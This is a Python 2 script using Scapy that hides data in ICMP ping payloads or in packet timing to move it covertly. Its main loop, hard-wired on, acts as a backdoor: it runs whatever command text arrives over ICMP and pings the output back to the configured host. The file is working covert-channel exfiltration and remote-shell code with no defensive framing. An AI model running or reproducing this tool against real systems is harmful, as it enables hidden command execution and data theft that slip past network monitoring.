from scapy.all import *
import sys, base64, argparse, os

def raw(p):
    return p[ICMP][Raw].load[16:32]

def isICMP(p):
    return p.haslayer(ICMP) and p[ICMP].type==8

def write(data, filename):
    f = open(filename, "w")
    f.write(data)
    f.close()

def timeBasedCommunication(interface):

    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

    # if interface is loopback for testing purposes,
    # each packet is duplicated so we need to remove it

    if interface == "lo":
        s = [s[i] for i in range(len(s)) if i % 2 == 0]

    msg = "1"

    for n in range(1, len(s)):
        diff = int((s[n].time - s[n-1].time) * 10)
        msg += (diff- (1 * (diff % 2 != 0)))/2 * "0" +  ("1" * (diff % 2 != 0))

    data = hex(int(msg, 2))[2:].replace("L", "").decode("hex")

    return data

def lastBytesCommunication(interface):
    s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
              stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

    buf = [raw(i) for i in s]

    # if interface is loopback for testing purposes,
    # each packet is duplicated so we need to remove it

    if interface == "lo":
        buf = [buf[i] for i in range(len(buf)) if i % 2 == 0]

    buf = ''.join(buf)
    dec = base64.b64decode(buf[:buf.find('\n')])

    return dec

def exfiltrateLastBytes(data, ip, src, verbose):

    if verbose:
        print "[*] Destination of data: {}".format(ip)
        if src:
            print "[*] Sending encoded file: {}".format(src)
        else:
            print "[*] Sending encoded message: \"{}\"".format(data)

    # add final signal to stop receiving data
    string = base64.b64encode(data).encode("hex") + "0a"

    # split into blocks to send message
    blocks = []
    for i in range(0, len(string), 32):
        blocks.append(string[i:i+32])

    # make last block padded
    blocks[-1] = blocks[-1] + (32 - len(blocks[-1])) * "0"

    # send blocks one by one
    for i in blocks:
        os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))

    if verbose:
        print "[*] Message sent to {}".format(ip)

def server(interface, mode):

    received = []

    for x in range(1):

        if mode == 1:
            data = lastBytesCommunication(interface)
        elif mode == 2:
            data = timeBasedCommunication(interface)
        else:
            return

        received.append(data)

    return "\n".join(received) + "\n"

def pwnShell(interface, mode, ip, receiver):

    while True:
        if receiver:
            data = ""
            while data == "":
                data = server(interface, mode)
            cmd = os.popen(data).read()
            exfiltrateLastBytes(cmd, ip, "", 0)
        else:
            cmd = raw_input("> ")
            exfiltrateLastBytes(cmd, ip, "", 0)
            data = ""
            while data == "":
                data = server(interface, mode)
            print data.strip()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
    parser.add_argument('-o', '--out', type=str, help='write received data on a file')
    parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
    parser.add_argument('-H', '--host', type=str, help='the destination of the packets (ex: 127.0.0.1)')

    requiredNamed = parser.add_argument_group('required named arguments')
    parser.add_argument('-i', '--interface', type=str, help='interface to listen on', required=True)

    args = parser.parse_args()

    print "[*] Started listener on interface: {}".format(args.interface)
    print "[*] Listening mode: {}".format(args.mode)

    shell = True

    if shell:
        pwnShell(args.interface, args.mode, args.host, 1)

    else:
        out = server(args.interface, args.mode, shell)

        if args.out:
            write(out, args.out)
            print "[*] Exfiltrated data saved to: {}".format(args.out)
